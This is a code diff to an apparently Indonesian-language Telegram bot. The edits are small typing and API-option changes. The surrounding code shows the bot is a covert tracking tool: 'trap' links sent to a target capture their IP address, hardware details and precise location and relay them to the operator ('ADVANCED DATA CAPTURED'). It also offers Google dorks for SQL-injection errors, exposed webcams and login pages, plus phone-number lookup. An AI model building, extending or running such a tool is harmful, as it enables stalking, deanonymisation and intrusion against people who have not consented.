@@ -114,7 +114,7 @@ async function startServer() {
   });
 
   // Backward compatibility alias
-  app.get('/t/:id', (req, res) => {
+  app.get('/t/:id', (req: any, res) => {
     req.params.tmplId = '1';
     app._router.handle(req, res, () => {});
   });
@@ -124,7 +124,7 @@ async function startServer() {
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
-      const data = req.body;
+      const data = req.body as any;
       const tmplId = data.tmplId || '1';
       const templateName = templates[tmplId] ? templates[tmplId].name : 'Default';
       
@@ -162,7 +162,7 @@ async function startServer() {
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
-      const data = req.body;
+      const data = req.body as any;
       let extraMsg = `📎 <b>ADVANCED DATA CAPTURED!</b> 📎\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
       
@@ -211,7 +211,7 @@ async function startServer() {
 
       botInstance.telegram.sendMessage(chatId, msg, { 
         parse_mode: 'HTML', 
-        disable_web_page_preview: false 
+        link_preview_options: { is_disabled: true }
       }).catch(console.error);
     }
     res.sendStatus(200);
@@ -404,7 +404,7 @@ async function startServer() {
       
       replyMessage += `<b>Cara Penggunaan:</b>\n1. Copy salah satu link di atas dan kirimkan ke target.\n2. Saat target membuka link, Anda mendapat IP Target.\n3. Jika target mengklik tombol dan mengizinkan (Allow) akses, Anda akan mendapat <b>Hardware Info</b> dan <b>Lokasi Presisi</b>.\n\n<i>Note: Sangat disarankan set host ke URL Production Anda menggunakan <code>/sethost</code> jika link di atas tidak bisa dibuka.</i>`;
       
-      ctx.reply(replyMessage, {parse_mode: 'HTML', disable_web_page_preview: true});
+      ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
     bot.command('ip', async (ctx) => {
@@ -428,7 +428,7 @@ async function startServer() {
           reply += `Proxy/VPN/Tor: ${data.proxy ? '⚠️ YA (Disembunyikan)' : '❌ Tidak'}\n`;
           reply += `Hosting/Datacenter: ${data.hosting ? '⚠️ YA (Server)' : '❌ Tidak'}\n\n`;
           reply += `<i>Catatan: Tracking IP Umum hanya menunjuk menara BTS / Server Provider terdekat, BUKAN rumah target. Untuk tracking target asli, gunakan fitur: <b>/logger</b></i>`;
-          ctx.reply(reply, { parse_mode: 'HTML', disable_web_page_preview: true });
+          ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
         } else {
           ctx.reply("❌ Gagal mendapatkan informasi IP.");
         }
@@ -664,7 +664,7 @@ async function startServer() {
         replyText += `<i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>`;
       }
 
-      ctx.reply(replyText, { disable_web_page_preview: true, parse_mode: 'HTML' });
+      ctx.reply(replyText, { link_preview_options: { is_disabled: true }, parse_mode: 'HTML' });
     });
 
     bot.command('mac', async (ctx) => {
@@ -702,7 +702,7 @@ async function startServer() {
         `• File PDF/DOC: <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
         `• Login Pages: <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Login</a>\n` +
         `• SQL Errors: <a href="https://www.google.com/search?q=${q}+%22you+have+an+error+in+your+sql+syntax%22">SQLi Dork</a>\n` +
-        `• Webcams: <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari CCTV/Webcam</a>`, {parse_mode: 'HTML', disable_web_page_preview: true});
+        `• Webcams: <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari CCTV/Webcam</a>`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
     bot.command('bininfo', async (ctx) => {
@@ -740,7 +740,7 @@ async function startServer() {
         const res = await fetch(`https://api.github.com/users/${args[1]}`);
         if(res.status !== 200) return ctx.reply("❌ User tidak ditemukan.");
         const data = await res.json();
-        ctx.reply(`🐙 <b>GitHub OSINT:</b>\n\nUsername: ${data.login}\nNama: ${data.name || '-'}\nBio: ${data.bio || '-'}\nLokasi: ${data.location || '-'}\nCompany: ${data.company || '-'}\nBlog: ${data.blog || '-'}\nPublic Repos: ${data.public_repos}\nFollowers: ${data.followers}\nDibuat: ${new Date(data.created_at).toISOString().split('T')[0]}\nURL: ${data.html_url}`, { parse_mode: 'HTML', disable_web_page_preview: true });
+        ctx.reply(`🐙 <b>GitHub OSINT:</b>\n\nUsername: ${data.login}\nNama: ${data.name || '-'}\nBio: ${data.bio || '-'}\nLokasi: ${data.location || '-'}\nCompany: ${data.company || '-'}\nBlog: ${data.blog || '-'}\nPublic Repos: ${data.public_repos}\nFollowers: ${data.followers}\nDibuat: ${new Date(data.created_at).toISOString().split('T')[0]}\nURL: ${data.html_url}`, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
       } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
     });
 
@@ -769,7 +769,7 @@ async function startServer() {
         `• Truecaller (Perlu Login): <a href="https://www.truecaller.com/search/global/${numID}">Cari di Truecaller</a>\n` +
         `• GetContact: (Cari via Apps, tidak bisa via web publik)\n` +
         `• WhatsApp Link: <a href="https://wa.me/${numID}">Chat WhatsApp</a>\n` +
-        `• Google Dork: <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Web Jejak Nomor</a>`, {parse_mode: 'HTML', disable_web_page_preview: true});
+        `• Google Dork: <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Web Jejak Nomor</a>`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
     bot.command('qr', (ctx) => {
